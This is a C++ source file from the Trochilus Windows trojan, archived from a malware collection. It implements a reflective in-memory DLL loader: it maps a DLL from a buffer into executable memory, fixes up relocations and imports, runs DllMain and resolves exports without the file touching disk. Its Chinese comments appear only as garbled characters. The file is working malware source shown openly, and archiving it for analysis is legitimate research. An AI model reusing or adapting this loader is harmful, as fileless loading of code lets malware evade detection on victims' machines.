/*
  name      Trochilus
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
// MemLoadDll.cpp: implementation of the CMemLoadDll class.
//
//////////////////////////////////////////////////////////////////////
#include "StdAfx.h"
#include "MemLoadDll.h"

#ifdef _DEBUG
#undef THIS_FILE
static char THIS_FILE[]=__FILE__;
#define new DEBUG_NEW
#endif

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
CMemLoadDll::CMemLoadDll()
{
	m_bIsLoadOk = FALSE;
	m_pImageBase = NULL;
	m_pDllMain = NULL;
}

CMemLoadDll::~CMemLoadDll()
{
	if(m_bIsLoadOk)
	{
	//	ASSERT(m_pImageBase != NULL);
	//	ASSERT(m_pDllMain   != NULL);
		//�ѹ���׼��ж��dll
		m_pDllMain((HINSTANCE)m_pImageBase, DLL_PROCESS_DETACH, 0);
		VirtualFree(m_pImageBase, 0, MEM_RELEASE);
	}
}

//MemLoadLibrary�������ڴ滺���������м���һ��dll����ǰ���̵ĵ�ַ�ռ䣬ȱʡλ��0x10000000
//����ֵ�� �ɹ�����TRUE , ʧ�ܷ���FALSE
//lpFileData: ���dll�ļ����ݵĻ�����
//nDataLength: �����������ݵ��ܳ���
BOOL CMemLoadDll::MemLoadLibrary(void* lpFileData, int nDataLength)
{
	if (m_pImageBase != NULL)
	{
		return FALSE;  //�Ѿ�����һ��dll����û���ͷţ����ܼ����µ�dll
	}
	//���������Ч�ԣ�����ʼ��
	if (!CheckDataValide(lpFileData, nDataLength))
	{
		return FALSE;
	}
	//��������ļ��ؿռ�
	int nImageSize = CalcTotalImageSize();

	if (nImageSize == 0)
	{
		return FALSE;
	}
	// ���������ڴ�
	void *pMemoryAddress = VirtualAlloc(NULL, nImageSize, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (pMemoryAddress == NULL)
	{
		return FALSE;
	}
	else
	{
		CopyDllDatas(pMemoryAddress, lpFileData); //����dll���ݣ�������ÿ����
		//�ض�λ��Ϣ
		if (m_pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress > 0
			&& m_pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size > 0)
		{
			DoRelocation(pMemoryAddress);
		}
		//��������ַ��
		if (!FillRavAddress(pMemoryAddress)) //���������ַ��ʧ��
		{
			VirtualFree(pMemoryAddress, 0, MEM_RELEASE);
			return FALSE;
		}
		//�޸�ҳ���ԡ�Ӧ�ø���ÿ��ҳ�����Ե����������Ӧ�ڴ�ҳ�����ԡ������һ�¡�
		//ͳһ���ó�һ������PAGE_EXECUTE_READWRITE
		unsigned long unOld;

		VirtualProtect(pMemoryAddress, nImageSize, PAGE_EXECUTE_READWRITE, &unOld);
	}
	//��������ַ
#ifdef WIN32
	m_pNTHeader->OptionalHeader.ImageBase = (DWORD)pMemoryAddress;
#else
	m_pNTHeader->OptionalHeader.ImageBase = (ULONGULONG)pMemoryAddress;
#endif
	//������Ҫ����һ��dll����ں���������ʼ��������
	m_pDllMain = (ProcDllMain)(m_pNTHeader->OptionalHeader.AddressOfEntryPoint + (PBYTE)pMemoryAddress);

	BOOL InitResult = m_pDllMain((HINSTANCE)pMemoryAddress, DLL_PROCESS_ATTACH, 0);

	if (!InitResult) //��ʼ��ʧ��
	{
		m_pDllMain((HINSTANCE)pMemoryAddress, DLL_PROCESS_DETACH, 0);
		VirtualFree(pMemoryAddress, 0, MEM_RELEASE);
		m_pDllMain = NULL;
		return FALSE;
	}
	
	m_bIsLoadOk = TRUE;
	m_pImageBase = pMemoryAddress;
	return TRUE;
}

BOOL CMemLoadDll::IsLoadOk()
{
	return m_bIsLoadOk;
}

//MemGetProcAddress������dll�л�ȡָ�������ĵ�ַ
//����ֵ�� �ɹ����غ�����ַ , ʧ�ܷ���NULL
//lpProcName: Ҫ���Һ��������ֻ������
FARPROC CMemLoadDll::MemGetProcAddress(LPCSTR lpProcName)
{
	if (m_pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress == 0 ||
		m_pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size == 0)
	{
		return NULL;
	}
	if (!m_bIsLoadOk)
	{
		return NULL;
	}
	
	DWORD dwOffsetStart = m_pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	DWORD dwSize = m_pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
	
	PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)m_pImageBase + m_pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	int iBase = pExport->Base;
	int iNumberOfFunctions = pExport->NumberOfFunctions;
	int iNumberOfNames = pExport->NumberOfNames; //<= iNumberOfFunctions
	LPDWORD pAddressOfFunctions = (LPDWORD)(pExport->AddressOfFunctions + (PBYTE)m_pImageBase);
	LPWORD  pAddressOfOrdinals = (LPWORD)(pExport->AddressOfNameOrdinals + (PBYTE)m_pImageBase);
	LPDWORD pAddressOfNames  = (LPDWORD)(pExport->AddressOfNames + (PBYTE)m_pImageBase);
	
	int iOrdinal = -1;
	
	if (((DWORD)lpProcName & 0xFFFF0000) == 0) //IT IS A ORDINAL!
	{
		iOrdinal = (DWORD)lpProcName & 0x0000FFFF - iBase;
	}
	else  //use name
	{
		int iFound = -1;
		
		for (int i=0; i<iNumberOfNames; i++)
		{
			char* pName= (char* )(pAddressOfNames[i] + (PBYTE)m_pImageBase);
			if (strcmp(pName, lpProcName) == 0)
			{
				iFound = i;
				break;
			}
		}
		if (iFound >= 0)
		{
			iOrdinal = (int)(pAddressOfOrdinals[iFound]);
		}
	}
	
	if (iOrdinal < 0 || iOrdinal >= iNumberOfFunctions )
	{
		return NULL;
	}
	else
	{
		DWORD pFunctionOffset = pAddressOfFunctions[iOrdinal];

		if (pFunctionOffset > dwOffsetStart && pFunctionOffset < (dwOffsetStart + dwSize))//maybe Export Forwarding
		{
			return NULL;
		}
		else
		{
			return (FARPROC)(pFunctionOffset + (PBYTE)m_pImageBase);
		}
	}
	
}

// �ض���PE�õ��ĵ�ַ
void CMemLoadDll::DoRelocation( void *pNewBase)
{
/* �ض�λ���Ľṹ��
// DWORD sectionAddress, DWORD size (����������Ҫ�ض�λ������)
// ���� 1000����Ҫ����5���ض�λ���ݵĻ����ض�λ����������
// 00 10 00 00   14 00 00 00      xxxx xxxx xxxx xxxx xxxx 0000
// -----------   -----------      ----
// �����ڵ�ƫ��  �ܳߴ�=8+6*2     ��Ҫ�����ĵ�ַ           ���ڶ���4�ֽ�
// �ض�λ�������ɸ����������address �� size����0 ��ʾ����
// ��Ҫ�����ĵ�ַ��12λ�ģ���4λ����̬�֣�intel cpu����3
	*/
	//����NewBase��0x600000,���ļ������õ�ȱʡImageBase��0x400000,������ƫ��������0x200000
	
	//ע���ض�λ����λ�ÿ��ܺ�Ӳ���ļ��е�ƫ�Ƶ�ַ��ͬ��Ӧ��ʹ�ü��غ�ĵ�ַ
	PIMAGE_BASE_RELOCATION pLoc = (PIMAGE_BASE_RELOCATION)((unsigned long)pNewBase 
		+ m_pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

	while ((pLoc->VirtualAddress + pLoc->SizeOfBlock) != 0) //��ʼɨ���ض�λ��
	{
		WORD *pLocData = (WORD *)((PBYTE)pLoc + sizeof(IMAGE_BASE_RELOCATION));
		//���㱾����Ҫ�������ض�λ���ַ������Ŀ
		int nNumberOfReloc = (pLoc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION))/sizeof(WORD);

		for ( int i=0 ; i < nNumberOfReloc; i++)
		{
			// ÿ��WORD����������ɡ���4λָ�����ض�λ�����ͣ�WINNT.H�е�һϵ��IMAGE_REL_BASED_xxx�������ض�λ���͵�ȡֵ��
			// ��12λ�������VirtualAddress���ƫ�ƣ�ָ���˱�������ض�λ��λ�á�
			if ((DWORD)(pLocData[i] & 0x0000F000) == 0x0000A000)
			{
				// 64λdll�ض�λ��IMAGE_REL_BASED_DIR64
				// ����IA-64�Ŀ�ִ���ļ����ض�λ�ƺ�����IMAGE_REL_BASED_DIR64���͵ġ�
#ifdef _WIN64
				ULONGLONG* pAddress = (ULONGLONG *)((PBYTE)pNewBase + pLoc->VirtualAddress + (pLocData[i] & 0x0FFF));
				ULONGLONG ullDelta = (ULONGLONG)pNewBase - m_pNTHeader->OptionalHeader.ImageBase;
				*pAddress += ullDelta;
#endif
			}
			else if ((DWORD)(pLocData[i] & 0x0000F000) == 0x00003000) //����һ����Ҫ�����ĵ�ַ
			{
				// 32λdll�ض�λ��IMAGE_REL_BASED_HIGHLOW
				// ����x86�Ŀ�ִ���ļ������еĻ�ַ�ض�λ����IMAGE_REL_BASED_HIGHLOW���͵ġ�
#ifndef _WIN64
				DWORD* pAddress = (DWORD *)((PBYTE)pNewBase + pLoc->VirtualAddress + (pLocData[i] & 0x0FFF));
				DWORD dwDelta = (DWORD)pNewBase - m_pNTHeader->OptionalHeader.ImageBase;
				*pAddress += dwDelta;
#endif
			}
		}
		//ת�Ƶ���һ���ڽ��д���
		pLoc = (PIMAGE_BASE_RELOCATION)((PBYTE)pLoc + pLoc->SizeOfBlock);
	}
}

//��������ַ��
BOOL CMemLoadDll::FillRavAddress(void *pImageBase)
{
	// �����ʵ������һ�� IMAGE_IMPORT_DESCRIPTOR �ṹ���飬ȫ����0��ʾ����
	// ���鶨�����£�
	// 
    // DWORD   OriginalFirstThunk;         // 0��ʾ����������ָ��δ�󶨵�IAT�ṹ����
    // DWORD   TimeDateStamp; 
    // DWORD   ForwarderChain;             // -1 if no forwarders
    // DWORD   Name;                       // ����dll������
    // DWORD   FirstThunk;                 // ָ��IAT�ṹ����ĵ�ַ(�󶨺���ЩIAT�������ʵ�ʵĺ�����ַ)
	unsigned long nOffset = m_pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress ;

	if (nOffset == 0)
	{
		return TRUE; //No Import Table
	}

	PIMAGE_IMPORT_DESCRIPTOR pID = (PIMAGE_IMPORT_DESCRIPTOR)((PBYTE)pImageBase + nOffset);

	while (pID->Characteristics != 0)
	{
		PIMAGE_THUNK_DATA pRealIAT = (PIMAGE_THUNK_DATA)((PBYTE)pImageBase + pID->FirstThunk);
		PIMAGE_THUNK_DATA pOriginalIAT = (PIMAGE_THUNK_DATA)((PBYTE)pImageBase + pID->OriginalFirstThunk);
		//��ȡdll������
		#define NAME_BUF_SIZE 256

		char szBuf[NAME_BUF_SIZE] = ""; //dll name;
		BYTE* pName = (BYTE*)((PBYTE)pImageBase + pID->Name);
		int i=0;

		for (i=0; i<NAME_BUF_SIZE; i++)
		{
			if (pName[i] == 0)
			{
				break;
			}
			szBuf[i] = pName[i];
		}
		if (i >= NAME_BUF_SIZE)
		{
			return FALSE;  // bad dll name
		}
		else
		{
			szBuf[i] = 0;
		}

		HMODULE hDll = GetModuleHandleA(szBuf);

		if (hDll == NULL)
		{
			hDll = LoadLibraryA(szBuf);
			if (hDll == NULL) return FALSE;
			//return FALSE; //NOT FOUND DLL
		}
		//��ȡDLL��ÿ�����������ĵ�ַ������IAT
		//ÿ��IAT�ṹ�� ��
		// union { PBYTE  ForwarderString;
        //   PDWORD Function;
        //   DWORD Ordinal;
        //   PIMAGE_IMPORT_BY_NAME  AddressOfData;
		// } u1;
		// ������һ��DWORD ����������һ����ַ��
		for (i=0; ; i++)
		{
			if (pOriginalIAT[i].u1.Function == 0)
			{
				break;
			}

			FARPROC lpFunction = NULL;

			if (pOriginalIAT[i].u1.Ordinal & IMAGE_ORDINAL_FLAG) //�����ֵ�������ǵ������
			{
				lpFunction = GetProcAddress(hDll, (LPCSTR)(pOriginalIAT[i].u1.Ordinal & 0x0000FFFF));
			}
			else //�������ֵ���
			{
				//��ȡ��IAT���������ĺ�������
				PIMAGE_IMPORT_BY_NAME pByName = (PIMAGE_IMPORT_BY_NAME)((PBYTE)pImageBase + (pOriginalIAT[i].u1.AddressOfData));

				lpFunction = GetProcAddress(hDll, (char *)pByName->Name);
			}
			if (lpFunction != NULL)   //�ҵ��ˣ�
			{
#ifdef _WIN64
				pRealIAT[i].u1.Function = (ULONGLONG)lpFunction;
#else
				pRealIAT[i].u1.Function = (DWORD)lpFunction;
#endif
			}
			else
			{
				return FALSE;
			}
		}
		
		//move to next 
		pID = (PIMAGE_IMPORT_DESCRIPTOR)((PBYTE)pID + sizeof(IMAGE_IMPORT_DESCRIPTOR));
	}

	return TRUE;
}

//CheckDataValide�������ڼ�黺�����е������Ƿ���Ч��dll�ļ�
//����ֵ�� ��һ����ִ�е�dll�򷵻�TRUE�����򷵻�FALSE��
//lpFileData: ���dll���ݵ��ڴ滺����
//nDataLength: dll�ļ��ĳ���
BOOL CMemLoadDll::CheckDataValide(void* lpFileData, int nDataLength)
{
	//��鳤��
	if (nDataLength < sizeof(IMAGE_DOS_HEADER))
	{
		return FALSE;
	}
	m_pDosHeader = (PIMAGE_DOS_HEADER)lpFileData;  // DOSͷ
	//���dosͷ�ı��
	if (m_pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
	{
		return FALSE;  //0x5A4D : MZ
	}
	
	//��鳤��
	if ((DWORD)nDataLength < (m_pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS)))
	{
		return FALSE;
	}
	//ȡ��peͷ
	m_pNTHeader = (PIMAGE_NT_HEADERS)((PBYTE)lpFileData + m_pDosHeader->e_lfanew); // PEͷ
	//���peͷ�ĺϷ���
	if (m_pNTHeader->Signature != IMAGE_NT_SIGNATURE)
	{
		return FALSE;  //0x00004550 : PE00
	}
	if ((m_pNTHeader->FileHeader.Characteristics & IMAGE_FILE_DLL) == 0) //0x2000  : File is a DLL
	{
		return FALSE;  
	}
	if ((m_pNTHeader->FileHeader.Characteristics & IMAGE_FILE_EXECUTABLE_IMAGE) == 0) //0x0002 : ָ���ļ���������
	{
		return FALSE;
	}
	if (m_pNTHeader->FileHeader.SizeOfOptionalHeader != sizeof(IMAGE_OPTIONAL_HEADER))
	{
		return FALSE;
	}	
	
	//ȡ�ýڱ����α���
	m_pSectionHeader = (PIMAGE_SECTION_HEADER)((PBYTE)m_pNTHeader + sizeof(IMAGE_NT_HEADERS));
	//��֤ÿ���ڱ��Ŀռ�
	for (int i=0; i< m_pNTHeader->FileHeader.NumberOfSections; i++)
	{
		if ((m_pSectionHeader[i].PointerToRawData + m_pSectionHeader[i].SizeOfRawData) > (DWORD)nDataLength)
		{
			return FALSE;
		}
	}

	return TRUE;
}

//�������߽�
int CMemLoadDll::GetAlignedSize(int nOrigin, int nAlignment)
{
	return (nOrigin + nAlignment - 1) / nAlignment * nAlignment;
}

//��������dllӳ���ļ��ĳߴ�
int CMemLoadDll::CalcTotalImageSize()
{
	int nSize = 0;

	if (m_pNTHeader == NULL)
	{
		return 0;
	}

	int nAlign = m_pNTHeader->OptionalHeader.SectionAlignment; //�ζ����ֽ���
	
	// ��������ͷ�ĳߴ硣����dos, coff, peͷ �� �α��Ĵ�С
	nSize = GetAlignedSize(m_pNTHeader->OptionalHeader.SizeOfHeaders, nAlign);
	// �������нڵĴ�С
	for (int i=0; i < m_pNTHeader->FileHeader.NumberOfSections; ++i)
	{
		//�õ��ýڵĴ�С
		int nCodeSize = m_pSectionHeader[i].Misc.VirtualSize ;
		int nLoadSize = m_pSectionHeader[i].SizeOfRawData;
		int nMaxSize = (nLoadSize > nCodeSize) ? (nLoadSize) : (nCodeSize);
		int nSectionSize = GetAlignedSize(m_pSectionHeader[i].VirtualAddress + nMaxSize, nAlign);

		if (nSize < nSectionSize)
		{
			nSize = nSectionSize;  //Use the Max;
		}
	}

	return nSize;
}

//CopyDllDatas������dll���ݸ��Ƶ�ָ���ڴ����򣬲��������н�
//pSrc: ���dll���ݵ�ԭʼ������
//pDest:Ŀ���ڴ��ַ
void CMemLoadDll::CopyDllDatas(void* pDest, void* pSrc)
{
	// ������Ҫ���Ƶ�PEͷ+�α��ֽ���
	int  nHeaderSize = m_pNTHeader->OptionalHeader.SizeOfHeaders;
	int  nSectionSize = m_pNTHeader->FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER);
	int  nMoveSize = nHeaderSize + nSectionSize;
	//����ͷ�Ͷ���Ϣ
	memcpy(pDest, pSrc, nMoveSize);
	
	//����ÿ����
	for (int i=0; i < m_pNTHeader->FileHeader.NumberOfSections; ++i)
	{
		if (m_pSectionHeader[i].VirtualAddress == 0 || m_pSectionHeader[i].SizeOfRawData == 0)
		{
			continue;
		}
		// ��λ�ý����ڴ��е�λ��
		void *pSectionAddress = (void *)((PBYTE)pDest + m_pSectionHeader[i].VirtualAddress);
		// ���ƶ����ݵ������ڴ�
		memcpy((void *)pSectionAddress, (void *)((PBYTE)pSrc + m_pSectionHeader[i].PointerToRawData),
			m_pSectionHeader[i].SizeOfRawData);
	}
	
	//����ָ�룬ָ���·�����ڴ�
	//�µ�dosͷ
	m_pDosHeader = (PIMAGE_DOS_HEADER)pDest;
	//�µ�peͷ��ַ
	m_pNTHeader = (PIMAGE_NT_HEADERS)((PBYTE)pDest + (m_pDosHeader->e_lfanew));
	//�µĽڱ���ַ
	m_pSectionHeader = (PIMAGE_SECTION_HEADER)((PBYTE)m_pNTHeader + sizeof(IMAGE_NT_HEADERS));
}
